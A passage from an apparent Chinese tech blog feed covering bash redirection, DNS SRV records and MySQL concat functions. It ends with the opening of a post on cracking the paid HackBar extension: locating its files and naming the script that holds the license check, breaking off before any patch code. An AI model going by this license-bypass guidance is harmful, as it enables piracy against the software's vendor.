之间的内容(document) 作为输入传递给 command。</p><blockquote><p>注意：</p><ul><li>结尾的delimiter 一定要顶格写，前面不能有任何字符，后面也不能有任何字符，包括空格和 tab 缩进</li><li>开始的delimiter前后的空格会被忽略掉</li></ul></blockquote><h2 id="有关覆盖"><a href="#有关覆盖" class="headerlink" title="有关覆盖"></a>有关覆盖</h2><p>如果我们用 <code>set -o noclobber</code> 设置bash，那bash将不会覆盖任何已经存在的文件，但是我们可以通过 <code>&gt;|</code> 绕过这个限制</p><p><strong>先来看一下默认的情况</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># testfile=$(mktemp /tmp/testNoClobberDate-XXXXXX)</span></span><br><span class="line">root@ubuntu:~<span class="comment"># date &gt; $testfile ; cat $testfile</span></span><br><span class="line">Tue 24 Mar 2020 05:05:53 PM CST</span><br><span class="line">root@ubuntu:~<span class="comment"># date &gt; $testfile ; cat $testfile</span></span><br><span class="line">Tue 24 Mar 2020 05:05:56 PM CST</span><br><span class="line">root@ubuntu:~<span class="comment"># date &gt; $testfile ; cat $testfile</span></span><br><span class="line">Tue 24 Mar 2020 05:06:13 PM CST</span><br></pre></td></tr></table></figure><p>如预期的一样，每一次重定向都覆盖了原文件</p><p><strong>下面我们设置 <code>noclobber</code> 标志</strong></p><p><code>set -o noclobber</code></p><p>然后重复上面的操作试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># date &gt; $testfile ; cat $testfile</span></span><br><span class="line">bash: /tmp/testNoClobberDate-yKVkaY: cannot overwrite existing file</span><br><span class="line">Tue 24 Mar 2020 05:06:13 PM CST</span><br><span class="line">root@ubuntu:~<span class="comment"># date &gt; $testfile ; cat $testfile</span></span><br><span class="line">bash: /tmp/testNoClobberDate-yKVkaY: cannot overwrite existing file</span><br><span class="line">Tue 24 Mar 2020 05:06:13 PM CST</span><br></pre></td></tr></table></figure><p>我们看到了bash的提示，不能覆盖已存在的文件，实际结果也是一样</p><p>如何进行绕过呢? 我们来试一下用 <code>&gt;|</code> 代替 <code>&gt;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># date &gt;| $testfile ; cat $testfile</span></span><br><span class="line">Tue 24 Mar 2020 05:10:45 PM CST</span><br><span class="line">root@ubuntu:~<span class="comment"># date &gt;| $testfile ; cat $testfile</span></span><br><span class="line">Tue 24 Mar 2020 05:10:49 PM CST</span><br></pre></td></tr></table></figure><p>我们发现此时可以覆盖已经存在的文件，我们查看一下目前的设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># set -o | grep noclobber</span></span><br><span class="line">noclobber       on</span><br></pre></td></tr></table></figure><p><code>noclobber</code> 的确是开启的，所以 <code>&gt;|</code> 的确可以绕过这一限制</p><p>使用 <code>set +o noclobber</code> 关闭这个限制，防止对我们后面的使用造成影响</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># set +o noclobber</span></span><br><span class="line">root@ubuntu:~<span class="comment"># set -o | grep noclobber</span></span><br><span class="line">noclobber       off</span><br><span class="line">root@ubuntu:~<span class="comment"># rm $testfile</span></span><br></pre></td></tr></table></figure><h2 id="其他的小点"><a href="#其他的小点" class="headerlink" title="其他的小点"></a>其他的小点</h2><h3 id="重定向到一处"><a href="#重定向到一处" class="headerlink" title="重定向到一处"></a>重定向到一处</h3><p>如果我们要将 <code>stdout</code> 和 <code>stderr</code> 重定向到同一个地方，该怎么写呢？</p><p>下面两种哪种是对的？</p><ol><li><code>ls -ld /tmp /tnt 2&gt;&amp;1 1&gt;a.txt</code></li><li><code>ls -ld /tmp /tnt 1&gt;b.txt 2&gt;&amp;1</code></li></ol><p>验证一下</p><p><strong>第一种写法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ls -ld /tmp /tnt 2&gt;&amp;1 1&gt;a.txt</span></span><br><span class="line">ls: cannot access <span class="string">'/tnt'</span>: No such file or directory</span><br><span class="line">root@ubuntu:~<span class="comment"># cat a.txt</span></span><br><span class="line">drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp</span><br></pre></td></tr></table></figure><p><strong>第二种写法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ls -ld /tmp /tnt 1&gt;b.txt 2&gt;&amp;1</span></span><br><span class="line">root@ubuntu:~<span class="comment"># cat b.txt</span></span><br><span class="line">ls: cannot access <span class="string">'/tnt'</span>: No such file or directory</span><br><span class="line">drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp</span><br></pre></td></tr></table></figure><p>我们可以看到第二种写法是正确的</p><p>同理，下面这种写法也正确</p><p><code>ls -ld /tmp /tnt 2&gt;b.txt 1&gt;&amp;2</code></p><h3 id="套个娃a"><a href="#套个娃a" class="headerlink" title="套个娃a"></a>套个娃a</h3><p>来点奇葩的，如果我们将 <code>stderr</code> 重定向到 <code>stdout</code>, 同时又将 <code>stdout</code> 重定向到 <code>stderr</code> 会发生什么？</p><p>如此套娃会不会导致回环卡死？</p><p>试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ls -ld /tmp /tnt 2&gt;&amp;1 1&gt;&amp;2  | sed -e s/^/++/</span></span><br><span class="line">++ls: cannot access <span class="string">'/tnt'</span>: No such file or directory</span><br><span class="line">++drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp</span><br></pre></td></tr></table></figure><p>我们发现都会从标准输出出来</p><p>反过来呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ls -ld /tmp /tnt 1&gt;&amp;2 2&gt;&amp;1  | sed -e s/^/++/</span></span><br><span class="line">ls: cannot access <span class="string">'/tnt'</span>: No such file or directory</span><br><span class="line">drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp</span><br></pre></td></tr></table></figure><p>我们发现都没有从标准输出出来，都是从标准错误输出出来的</p><blockquote><p>也就是说 <code>a&gt;&amp;b b&gt;&amp;a</code> 这种套娃写法中， b才是出口</p></blockquote><h2 id="阅读更多内容"><a href="#阅读更多内容" class="headerlink" title="阅读更多内容"></a>阅读更多内容</h2><p>如果你想了解功能，通过下面的命令查看官方文档吧</p><p><code>man -Len -Pless\ +/^REDIRECTION bash</code></p><p>本文的参考资料： <a href="https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean" target="_blank" rel="noopener">stack overflow</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;经常会看到别人的shell脚本后面有一个 &lt;code&gt;2&amp;gt;&amp;amp;1&lt;/code&gt; ，一直没去深究，今天这个话题就以这个为出发点进行展开，学习一下linux shell中重定向的话题。&lt;/p&gt;
&lt;h2 id=&quot;特殊的东西&quot;&gt;&lt;a href=&quot;#特殊的东西&quot; clas
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="linux" scheme="https://blog.lgf.im/tags/linux/"/>
    
      <category term="shell" scheme="https://blog.lgf.im/tags/shell/"/>
    
      <category term="coding" scheme="https://blog.lgf.im/tags/coding/"/>
    
  </entry>
  
  <entry>
    <title>DNS中SRV记录</title>
    <link href="https://blog.lgf.im/2020/dns-srv-record.html"/>
    <id>https://blog.lgf.im/2020/dns-srv-record.html</id>
    <published>2020-03-24T05:54:03.000Z</published>
    <updated>2020-06-18T05:55:25.991Z</updated>
    
    <content type="html"><![CDATA[<p>SRV记录是服务器资源记录的缩写，是DNS服务器的数据库中支持的一种记录服务器提供的服务资源的记录，主要作用是说明一个服务器能够提供什么样的服务。</p><p>简单来说，SRV记录了哪台计算机提供了哪个服务这么一个简单的信息。</p><p>SRV记录是DNS记录中的新鲜面孔，在RFC2052中才对SRV记录进行了定义，因此很多老版本的DNS服务器并不支持SRV记录。</p><h3 id="RFC2782"><a href="#RFC2782" class="headerlink" title="RFC2782"></a>RFC2782</h3><h4 id="概述和理由"><a href="#概述和理由" class="headerlink" title="概述和理由"></a>概述和理由</h4><p>目前，必须知道服务器的确切地址才能联系它或者广播问题。</p><p>SRV RR允许管理员为单个域名使用多个服务器，轻松地将服务从一个主机移动到另一个主机，并将某些主机指定为服务的主服务器，将其他主机指定为备份。</p><p>客户端要求特定域名的特定服务/协议（这里使用的词汇”域名”是RFC 1034上严格定义的），并获取任何可用服务器的名称。</p><p>请注意，在本文档引用“地址记录”时，它表示A RR，AAAA RR或其最现代的等价物。</p><h4 id="RFC定义的格式"><a href="#RFC定义的格式" class="headerlink" title="RFC定义的格式"></a>RFC定义的格式</h4><p>RFC2782中定义的格式是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_Service._Proto.Name TTL Class SRV Priority Weight Port Target</span><br></pre></td></tr></table></figure><p>各字段详细说明：</p><table><thead><tr><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>Service</td><td>所需服务的符号名称。在Assigned Numbers或本地定义。服务标识符前面加上下划线<code>_</code>，以避免与自然界中出现的DNS标签发生冲突。</td></tr><tr><td>Proto</td><td>所需协议的符号名称。前面加下划线<code>_</code>，以防止与自然界中出现的DNS标签发生冲突。 <code>_TCP</code>和<code>_UDP</code>目前是该字段最常用的值，但可以使用由Assigned Numbers或本地定义的任何名称。 Proto不区分大小写。</td></tr><tr><td>Name</td><td>此RR所指的域名。在这个域名下SRV RR是唯一的。（英文原文好像有些语法问题）</td></tr><tr><td>TTL</td><td></td></tr><tr><td>Class</td><td></td></tr><tr><td>Priority</td><td></td></tr><tr><td>Weight</td><td></td></tr><tr><td>Port</td><td>服务在目标主机上的端口。所需协议的符号名称，前面加下划线（_），以防止与自然界中出现的DNS标签发生冲突。 _TCP和_UDP目前是该字段最有用的值，但可以使用由Assigned Numbers定义的任何名称或本地的（如Service）。 Proto不区分大小写。范围是0-65535。 这是网络字节顺序中的16位无符号整数。 通常在Assigned Numbers中指定，但不一定如此。</td></tr><tr><td>Target</td><td>目标主机的域名。 域名必须有一个或多个地址记录，域名绝不能是别名。敦促（但不强求）实现在附加数据部分中返回地址记录。除非并且直到将来的标准操作允许，否则名称压缩不能用于此字段。值为“.” 表示该域名明确无法提供该服务。</td></tr></tbody></table><h3 id="SRV记录和微软的关系"><a href="#SRV记录和微软的关系" class="headerlink" title="SRV记录和微软的关系"></a>SRV记录和微软的关系</h3><p>SRV记录在微软的Active Directory中有着重要地位，大家知道在NT4时代域和DNS并没有太多关系。但从Win2000开始，域就离不开DNS的帮助了，为什么呢？因为域内的计算机要依赖DNS的SRV记录来定位域控制器！微软的即时通讯服务器Live Communications Server也可以依靠SRV记录定位即时通讯服务器。</p><p>SRV 记录一般是为Microsoft的活动目录设置时的应用。DNS可以独立于活动目录，但是活动目录必须有DNS的帮助才能工作。为了活动目录能够正常的工作，DNS服务器必须支持服务定位（SRV）资源记录，资源记录把服务名字映射为提供服务的服务器名字。活动目录客户和域控制器使用SRV资源记录决定域控制器的IP地址。</p><p>鉴于SRV记录可以定位特定服务器的位置，我们可以预计，在微软将来的服务器产品中SRV记录将发挥越来越多的作用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;SRV记录是服务器资源记录的缩写，是DNS服务器的数据库中支持的一种记录服务器提供的服务资源的记录，主要作用是说明一个服务器能够提供什么样的服务。&lt;/p&gt;
&lt;p&gt;简单来说，SRV记录了哪台计算机提供了哪个服务这么一个简单的信息。&lt;/p&gt;
&lt;p&gt;SRV记录是DNS记录中的新鲜
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="DNS" scheme="https://blog.lgf.im/tags/DNS/"/>
    
      <category term="SRV" scheme="https://blog.lgf.im/tags/SRV/"/>
    
  </entry>
  
  <entry>
    <title>MySQL中几个concat的用法与区别</title>
    <link href="https://blog.lgf.im/2020/mysql-concat-concat-ws-group-concat.html"/>
    <id>https://blog.lgf.im/2020/mysql-concat-concat-ws-group-concat.html</id>
    <published>2020-03-22T10:23:34.000Z</published>
    <updated>2020-06-18T05:55:25.995Z</updated>
    
    <content type="html"><![CDATA[<h2 id="讲解与示例"><a href="#讲解与示例" class="headerlink" title="讲解与示例"></a>讲解与示例</h2><h3 id="CONCAT-str1-str2-…"><a href="#CONCAT-str1-str2-…" class="headerlink" title="CONCAT(str1, str2, …)"></a>CONCAT(str1, str2, …)</h3><ol><li>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL</li><li>参数可以是字段名或具体值</li></ol><p>注意：</p><ol><li>如果所有参数均为非二进制字符串，则结果为非二进制字符串</li><li>如果自变量中含有任一二进制字符串，则结果为一个二进制字符串</li><li>一个数字参数被转化为与之相等的二进制字符串格式</li><li>若要避免这种情况，可使用显式类型 cast, 例如： <code>SELECT CONCAT(CAST(int_col AS CHAR), char_col)</code></li></ol><h4 id="MySQL的concat函数可以连接一个或者多个字符串"><a href="#MySQL的concat函数可以连接一个或者多个字符串" class="headerlink" title="MySQL的concat函数可以连接一个或者多个字符串"></a>MySQL的concat函数可以连接一个或者多个字符串</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(<span class="string">'10'</span>);</span><br><span class="line">+--------------+</span><br><span class="line">| concat(<span class="string">'10'</span>) |</span><br><span class="line">+--------------+</span><br><span class="line">| 10   |</span><br><span class="line">+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line">mysql&gt; select concat(<span class="string">'11'</span>,<span class="string">'22'</span>,<span class="string">'33'</span>);</span><br><span class="line">+------------------------+</span><br><span class="line">| concat(<span class="string">'11'</span>,<span class="string">'22'</span>,<span class="string">'33'</span>) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 112233 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="MySQL的concat函数在连接字符串的时候，只要其中一个是NULL-那么将返回NULL"><a href="#MySQL的concat函数在连接字符串的时候，只要其中一个是NULL-那么将返回NULL" class="headerlink" title="MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL"></a>MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(<span class="string">'11'</span>,<span class="string">'22'</span>,null);</span><br><span class="line">+------------------------+</span><br><span class="line">| concat(<span class="string">'11'</span>,<span class="string">'22'</span>,null) |</span><br><span class="line">+------------------------+</span><br><span class="line">| NULL   |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="CONCAT-WS-separator-str1-str2-…"><a href="#CONCAT-WS-separator-str1-str2-…" class="headerlink" title="CONCAT_WS(separator,str1,str2,…)"></a>CONCAT_WS(separator,str1,str2,…)</h3><p>CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。</p><p>注意：</p><ol><li>参数可以是字段名或具体值</li><li>如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。（只保留非空值）</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat_ws(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'33'</span>);</span><br><span class="line">+--------------------------+</span><br><span class="line">| concat_ws(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'33'</span>) |</span><br><span class="line">+--------------------------+</span><br><span class="line">| 33                       |</span><br><span class="line">+--------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.04 sec)</span><br></pre></td></tr></table></figure><h4 id="如连接后以逗号分隔"><a href="#如连接后以逗号分隔" class="headerlink" title="如连接后以逗号分隔"></a>如连接后以逗号分隔</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat_ws(<span class="string">','</span>,<span class="string">'11'</span>,<span class="string">'22'</span>,<span class="string">'33'</span>);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| concat_ws(<span class="string">','</span>,<span class="string">'11'</span>,<span class="string">'22'</span>,<span class="string">'33'</span>) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| 11,22,33 |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="和MySQL中concat函数不同的是-concat-ws函数在执行的时候-不会因为NULL值而返回NULL"><a href="#和MySQL中concat函数不同的是-concat-ws函数在执行的时候-不会因为NULL值而返回NULL" class="headerlink" title="和MySQL中concat函数不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL"></a>和MySQL中concat函数不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat_ws(<span class="string">','</span>,<span class="string">'11'</span>,<span class="string">'22'</span>,NULL);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| concat_ws(<span class="string">','</span>,<span class="string">'11'</span>,<span class="string">'22'</span>,NULL) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| 11,22 |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="GROUP-CONCAT-函数"><a href="#GROUP-CONCAT-函数" class="headerlink" title="GROUP_CONCAT() 函数"></a>GROUP_CONCAT() 函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])</span><br></pre></td></tr></table></figure><h4 id="基本查询"><a href="#基本查询" class="headerlink" title="基本查询"></a>基本查询</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from aa;</span><br><span class="line">+------+------+</span><br><span class="line">| id| name |</span><br><span class="line">+------+------+</span><br><span class="line">|1 | 10|</span><br><span class="line">|1 | 20|</span><br><span class="line">|1 | 20|</span><br><span class="line">|2 | 20|</span><br><span class="line">|3 | 200   |</span><br><span class="line">|3 | 500   |</span><br><span class="line">+------+------+</span><br><span class="line">6 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="以id分组，把name字段的值打印在一行，逗号分隔-默认"><a href="#以id分组，把name字段的值打印在一行，逗号分隔-默认" class="headerlink" title="以id分组，把name字段的值打印在一行，逗号分隔(默认)"></a>以id分组，把name字段的值打印在一行，逗号分隔(默认)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id,group_concat(name) from aa group by id;</span><br><span class="line">+------+--------------------+</span><br><span class="line">| id| group_concat(name) |</span><br><span class="line">+------+--------------------+</span><br><span class="line">|1 | 10,20,20|</span><br><span class="line">|2 | 20 |</span><br><span class="line">|3 | 200,500|</span><br><span class="line">+------+--------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="以id分组，把去冗余的name字段的值打印在一行，逗号分隔"><a href="#以id分组，把去冗余的name字段的值打印在一行，逗号分隔" class="headerlink" title="以id分组，把去冗余的name字段的值打印在一行，逗号分隔"></a>以id分组，把去冗余的name字段的值打印在一行，逗号分隔</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id,group_concat(distinct name) from aa group by id;</span><br><span class="line">+------+-----------------------------+</span><br><span class="line">| id| group_concat(distinct name) |</span><br><span class="line">+------+-----------------------------+</span><br><span class="line">|1 | 10,20|</span><br><span class="line">|2 | 20   |</span><br><span class="line">|3 | 200,500 |</span><br><span class="line">+------+-----------------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序"><a href="#以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序" class="headerlink" title="以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序"></a>以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id,group_concat(name order by name desc) from aa group by id;</span><br><span class="line">+------+---------------------------------------+</span><br><span class="line">| id| group_concat(name order by name desc) |</span><br><span class="line">+------+---------------------------------------+</span><br><span class="line">|1 | 20,20,10   |</span><br><span class="line">|2 | 20|</span><br><span class="line">|3 | 500,200|</span><br><span class="line">+------+---------------------------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p><a href="https://stackoverflow.com/questions/11889391/difference-between-group-concat-and-concat-ws" target="_blank" rel="noopener">https://stackoverflow.com/questions/11889391/difference-between-group-concat-and-concat-ws</a></p><h3 id="concat-ws"><a href="#concat-ws" class="headerlink" title="concat_ws"></a>concat_ws</h3><p><a href="http://www.w3resource.com/mysql/string-functions/mysql-concat_ws-function.php" target="_blank" rel="noopener">http://www.w3resource.com/mysql/string-functions/mysql-concat_ws-function.php</a></p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/mysql-concat-concat-ws-group-concat/concat_ws.png" loading="lazy" class="" title="[concat_ws]"><h3 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h3><p><a href="http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php" target="_blank" rel="noopener">http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php</a></p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/mysql-concat-concat-ws-group-concat/group_concat.gif" loading="lazy" class="" title="[group_concat]">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;讲解与示例&quot;&gt;&lt;a href=&quot;#讲解与示例&quot; class=&quot;headerlink&quot; title=&quot;讲解与示例&quot;&gt;&lt;/a&gt;讲解与示例&lt;/h2&gt;&lt;h3 id=&quot;CONCAT-str1-str2-…&quot;&gt;&lt;a href=&quot;#CONCAT-str1-str2-…&quot; cla
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="sql" scheme="https://blog.lgf.im/tags/sql/"/>
    
      <category term="coding" scheme="https://blog.lgf.im/tags/coding/"/>
    
      <category term="mysql" scheme="https://blog.lgf.im/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>HackBar破解</title>
    <link href="https://blog.lgf.im/2020/hack-hackbar.html"/>
    <id>https://blog.lgf.im/2020/hack-hackbar.html</id>
    <published>2020-03-22T02:11:42.000Z</published>
    <updated>2020-06-18T05:55:25.991Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>相信很多研究安全或者打CTF的朋友都在使用HackBar，在浏览器中使用HackBar构造并发送请求非常方便，特别是测试sql注入和xss等常见漏洞。</p><p>但是HackBar是收费软件，在其 <a href="https://hackbar.site/" target="_blank" rel="noopener">官网</a> 上，价格由3刀到89刀不等。很多安全研究人员会选择购买89刀的10年证书，但是对于学生来说，短期的一个月1刀的短期价格对于这样一个浏览器插件来说还是比较贵的。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/hack-hackbar/price.jpg" loading="lazy" class="" title="[官网价格]"><p>考虑到浏览器扩展插件的逻辑代码都是js代码，并且大部分工具类插件的代码都存放在本地，所以破解这类软件变得非常简单。</p><p>未破解前的hackbar是这样的，按钮没法用，显示一个红框</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/hack-hackbar/not-hack.jpg" loading="lazy" class="" title="[破解前]"><p>下面我将以Chrome浏览器为例，对HackBar插件进行破解。</p><h2 id="破解插件"><a href="#破解插件" class="headerlink" title="破解插件"></a>破解插件</h2><h3 id="找到插件路径"><a href="#找到插件路径" class="headerlink" title="找到插件路径"></a>找到插件路径</h3><p>首先我们需要在官网上找到插件的安装地址并进行安装</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/hack-hackbar/install.jpg" loading="lazy" class="" title="[install]"><p>安装后插件会存放在我们电脑的本地</p><p>在chrome中打开 <a href="chrome://version/">version</a> 页面，可以在 <code>个人资料路径</code> 位置找到Chrome浏览器数据的存放位置</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/hack-hackbar/chrome-version.jpg" loading="lazy" class="" title="[version页面]"><p>我们在文件管理器中打开这个路径，找到里面的<code>Extension</code>目录，这个目录里面就存放了我们的所有扩展插件</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/hack-hackbar/dirpath.jpg" loading="lazy" class="" title="[插件位置]"><p>我们可以在扩展程序界面看到所有插件的ID，找到HackBar的ID，然后从Extension目录中找到这个目录，进入后就是HackBar的插件目录</p><h3 id="分析授权验证"><a href="#分析授权验证" class="headerlink" title="分析授权验证"></a>分析授权验证</h3><p>我们先将插件这个目录复制出来，然后用编辑器打开，其中授权验证相关代码在 <code>theme\js\hackbar-panel.js</code> 这个js文件中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 